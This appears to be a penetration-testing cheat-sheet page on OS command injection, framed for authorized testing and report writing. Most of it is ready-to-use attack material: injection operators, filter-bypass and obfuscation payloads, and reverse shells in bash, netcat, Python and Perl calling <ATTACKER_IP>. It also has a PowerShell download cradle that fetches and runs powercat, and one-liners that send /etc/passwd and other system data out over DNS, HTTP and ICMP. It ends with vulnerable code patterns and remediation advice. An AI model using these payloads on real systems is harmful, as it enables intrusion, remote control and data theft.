# Command Injection

The app passes your input into an OS shell. You append your own commands and the server runs them — straight to RCE and, usually, the fastest path to a foothold on the box. Hunt it wherever a parameter feeds something that smells like a shell call (ping/traceroute tools, file converters, PDF/image processors, admin panels), which you catalogued during [Web Enumeration](web-enumeration.md).

{% hint style="warning" %}
A `sleep 5` delay or an `id` in the response proves execution. It does **not** prove impact. For the report, escalate to an interactive reverse shell and show `whoami`/`hostname` plus the file you read as that user. Single-shot `id` is the bug; the shell is the finding.
{% endhint %}

## Injection operators

Chain your command onto the app's with one of these. Which ones work tells you the shell and the parsing.

```bash
; ls          # sequential — always run next (Linux sh/bash)
&& ls         # AND — run next only if the first succeeded
|| ls         # OR — run next only if the first failed
| ls          # pipe — feed output as input (also runs your command)
& ls          # background / chain (works on Windows too)
` ls `        # backtick command substitution (Linux)
$( ls )       # dollar-paren substitution (Linux, preferred)
%0a ls        # newline — sneaks past filters that only look for ; and |
```

## Detect

```bash
# Direct output — append and read the result
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
127.0.0.1 || whoami

# No visible output? Prove execution with a delay:
127.0.0.1; sleep 5                 # Linux
127.0.0.1 & ping -n 5 127.0.0.1    # Windows (5 pings ~= 4s)
```

## Which shell am I in?

You have RCE but don't know what's parsing your command. This one-liner branches on syntax that means different things in each shell — the reply names the shell.

```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

URL-encoded (safer through most WAFs):

```
%28dir%202%3E%261%20*%60%7Cecho%20CMD%29%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
```

| Reply | Shell |
| --- | --- |
| `CMD` | Windows `cmd.exe` — backtick is literal, `dir *` runs, `\|echo CMD` fires |
| `PowerShell` | PowerShell — backtick-pipe is a comment, `&<# rem #>` runs the echo |
| `dir: command not found` | Linux/bash |

Once you know the shell, pick the matching payload below.

## Bypass filters

### Spaces blocked

```bash
ping	127.0.0.1          # literal tab
{ping,127.0.0.1}           # brace expansion
{ls,-la}
ping${IFS}127.0.0.1        # IFS = Internal Field Separator
cat${IFS}/etc/passwd
IFS=,;ping,127.0.0.1
cat</etc/passwd            # redirection instead of an argument space
```

### Linux keyword / character blacklist

```bash
# Break the word so a literal-string filter misses it
l\s
w\h\o\a\m\i
c''at /et''c/pas''swd
"l"s
'l's

# Case (filters are often case-sensitive; the shell resolves it anyway via tr)
$(tr "[A-Z]" "[a-z]" <<< "WHOAMI")

# Insert an empty expansion mid-word
who$()ami
whoami$()

# Wildcards
w?oami
wh*mi
/???/c?t /etc/passwd
```

### Windows blacklist

```bash
who^ami          # caret escape (cmd.exe)
c^md
p^owershell
w"h"oami         # embedded quotes
"cmd.exe" /c whoami
CoMd.ExE         # case
%ComSpec% /c whoami
%windir%\system32\cmd.exe /c whoami
```

### PowerShell obfuscation

```powershell
$cmd = 'w'+'h'+'oami'; iex $cmd     # concatenate + Invoke-Expression
&$cmd
iex('whoami')
[System.Diagnostics.Process]::Start('cmd.exe','/c whoami')   # .NET reflection
```

### Encoding when everything else is filtered

```bash
# Newline injection
param=value%0aid

# Hex-built path
cat $(echo -e '\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')   # /etc/passwd
$(printf '\057\145\164\143\057\160\141\163\163\167\144')        # octal

# Variable concatenation
a='ca';b='t /';c='etc';d='/pa';e='sswd';$a$b$c$d$e

# Reverse the command
echo 'dwssap/cte/ tac' | rev | bash

# Base64 the whole command
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash

# Pull characters out of environment variables (space, slash, etc.)
echo ${PATH:0:1}        # -> /
echo ${LS_COLORS:10:1}  # -> ; (semicolon)
```

Automated obfuscators when the filter is thorough: **Bashfuscator** on Linux (`./bashfuscator -c 'cat /etc/passwd'`) and **Invoke-DOSfuscation** on Windows cmd.

## Weaponize — get a shell

### Linux reverse shells

```bash
# Bash /dev/tcp (URL-encode & and > when it rides in a parameter)
; bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'

# netcat
; nc <ATTACKER_IP> 4444 -e /bin/bash

# Python
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl
; perl -e 'use Socket;$i="<ATTACKER_IP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")};'
```

### Windows — PowerShell download-cradle to a stable shell

Serve a shell helper and catch the callback:

```bash
# On <ATTACKER_IP>
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80
nc -nvlp 4444
```

Inject (URL-encoded on the wire):

```
& powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<ATTACKER_IP>/powercat.ps1'); powercat -c <ATTACKER_IP> -p 4444 -e powershell"
```

Powercat flags: `-c` connect back, `-p` port, `-e` program to bridge (`powershell`/`cmd`), `-l` listen (bind mode), `-u` UDP, `-r tcp:host:port` relay.

Catch any Linux callback with `nc -lvnp 4444`.

## Blind / out-of-band command injection

When nothing comes back in the response, confirm with timing, then exfiltrate through DNS/HTTP/ICMP.

### Confirm with a delay

```bash
; sleep 5 ;
| sleep 5 |
`sleep 5`
$(sleep 5)
; ping -c 5 127.0.0.1 ;    # counts ICMP packets ~= 4s
```

### Exfiltrate out of band

```bash
# DNS — you read the subdomain in your resolver / Responder log
; nslookup $(whoami).<ATTACKER_IP> ;
; host $(cat /etc/hostname).attacker.dns ;

# HTTP — data lands in your web-server log
; curl http://<ATTACKER_IP>/?d=$(cat /etc/passwd | base64 -w 0) ;
; wget http://<ATTACKER_IP>/$(id | base64) ;

# ICMP — when only ping egresses
; ping -c 1 -p $(xxd -p -l 16 /etc/passwd) <ATTACKER_IP> ;

# Redirect output to a web-readable file, then browse to it
; ls /home > /var/www/html/output.txt ;
```

Catch DNS/HTTP with a listener:

```bash
python3 -m http.server 80
```

## Real-world sinks and gotchas

**Header-based injection through `sudo system()`.** Admin panels that pass header values into a shell without escaping are a common find. Try the injection in headers, not just parameters:

```bash
curl http://<TARGET>/firewall.php \
     -H "X-Forwarded-For: ;bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/9000 0>&1';" \
     -b "PHPSESSID=<valid>"
```

Other sinks worth trying on any admin panel: `User-Agent` (logged then grepped), `Referer` (analytics), `Cookie` (session lookups), the login `username` field before auth, and `filename=` on upload forms.

**Stateless webshell chaining.** Each webshell request is a fresh process — no working directory persists. Chain with `&&` on one line and use absolute paths:

```bash
curl "http://<TARGET>/inc/data.php" -H "Cmd: $(echo -n 'cd /home && ls' | base64)"
```

**Reverse shell fired but never landed?** Diagnose whether it's the payload or egress filtering with tcpdump:

```bash
sudo tcpdump -i tun0 -n 'src host <TARGET>'
# SYN observed  -> payload ran, egress dropped the callback -> change destination port (try 80/443)
# No SYN        -> payload never executed -> change the payload variant
```

## Vulnerable code patterns (to recognize and to cite in the report)

```php
// PHP — unsafe
$output = shell_exec($_GET['cmd']);
system($_GET['cmd']); exec($_GET['cmd']); passthru($_GET['cmd']);
```

```javascript
// Node.js — unsafe
require('child_process').exec(req.query.cmd);
```

```python
# Python — unsafe
os.system(user_input)
subprocess.call(user_input, shell=True)
```

The unsafe common thread: user input concatenated into a string handed to a shell interpreter.

## Testing workflow

```bash
# 1. Identify input vectors: URL params, POST data, headers, cookies, filenames - see Web Enumeration
# 2. Test each operator: ;  |  &&  ||  &  and %0a
# 3. If simple injection fails, layer space + keyword bypasses
# 4. No output? Confirm with time-based (sleep / ping), then OOB exfil
# 5. Identify the shell (the branching one-liner above), then fire the matching reverse shell
# 6. Catch it, upgrade to a stable shell, and prove impact
burpsuite      # intercept and fuzz operators/bypasses across every parameter and header
nc -lvnp 4444  # your catcher
```

## Prove impact, don't just `sleep 5`

For the [report](report-writing.md), show the real consequence: an interactive shell with `whoami`/`hostname`/`ip a`, a sensitive file read as the web user, or lateral movement off the box. The delay proves the bug exists; the shell and what it reaches prove the finding and drive the severity.

## Fix guidance (for the remediation section)

* **Don't call a shell.** Use exec-style APIs that take an argument array, never a command string: `execFile(cmd, [args])`, `subprocess.run([...], shell=False)`, PHP `escapeshellarg()` on each argument.
* **Allowlist**, don't blacklist. Validate against a fixed set of permitted values (e.g. a real IP for a ping tool); reject the shell metacharacters `; | & < > $ \` ( ) { } \` entirely.
* **Least privilege**: run the web process as an unprivileged user so an injection can't reach root-owned files or `sudo`.
* **OS hardening**: AppArmor/SELinux confinement limits what a popped shell can touch.

## Related

* [Web Enumeration](web-enumeration.md) — find the parameters and headers that reach a shell first
* [HTTP Attacks](http-attacks.md) · [SQL Injection](sql-injection.md) · [File Inclusion](file-inclusion.md) · [File Upload](file-upload.md)
* [Cross-Site Scripting](xss.md) — client-side injection when the input never hits the OS
* [Server-Side Attacks](server-side-attacks.md) — SSRF, SSTI, and deserialization that also end in RCE
* [Report Writing](report-writing.md) — turning a reverse shell into a rated finding
